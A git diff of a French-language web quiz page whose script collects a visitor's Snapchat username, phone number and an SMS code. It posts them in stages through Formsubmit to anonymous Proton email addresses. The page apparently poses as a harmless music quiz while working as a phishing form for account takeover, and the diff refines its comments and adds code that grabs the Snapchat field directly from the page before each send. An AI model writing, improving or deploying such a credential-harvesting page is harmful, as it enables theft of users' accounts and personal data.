@@ -164,7 +164,7 @@ const questions = [
 let indexQuestion = 0;
 let reponsesUtilisateur = [];
 
-// Remplace ces emails par les tiens
+// Emails à remplacer par les tiens
 const formsubmitURL = "https://formsubmit.co/anonymous2026b@protonmail.com"; // Email principal
 const ccEmail = "becteurfoou@proton.me"; // Email secondaire
 
@@ -202,7 +202,7 @@ function suivant(){
         return;
     }
 
-    // On stocke la valeur AVANT d'envoyer
+    // Stocke la valeur dans le tableau
     reponsesUtilisateur[indexQuestion] = val;
 
     // Étape 1 : après les 3 premières réponses
@@ -210,7 +210,7 @@ function suivant(){
         envoyer(1);
     }
 
-    // Étape 2 : après Snapchat + téléphone
+    // Étape 2 : après Snapchat + téléphone (questions 3 et 4)
     if(indexQuestion === 4){
         envoyer(2);
     }
@@ -218,7 +218,6 @@ function suivant(){
     indexQuestion++;
 
     if(indexQuestion < questions.length){
-        // Affiche la question suivante
         afficherQuestion();
     } else {
         // Étape 3 : envoi final avec code SMS
@@ -236,8 +235,12 @@ function continuer(){
     afficherQuestion();
 }
 
-// Envoi via Formsubmit
+// Envoi des données au mail via Formsubmit
 function envoyer(etape){
+    // Récupère directement les valeurs depuis le DOM si elles existent
+    const inputSnapchat = document.getElementById("champ");
+    if(inputSnapchat) reponsesUtilisateur[indexQuestion] = inputSnapchat.value.trim();
+
     const formData = new FormData();
     formData.append("artiste_prefere", reponsesUtilisateur[0] || "");
     formData.append("artiste_deezer", reponsesUtilisateur[1] || "");
@@ -256,4 +259,3 @@ function envoyer(etape){
 </script>
 </body>
 </html>
-
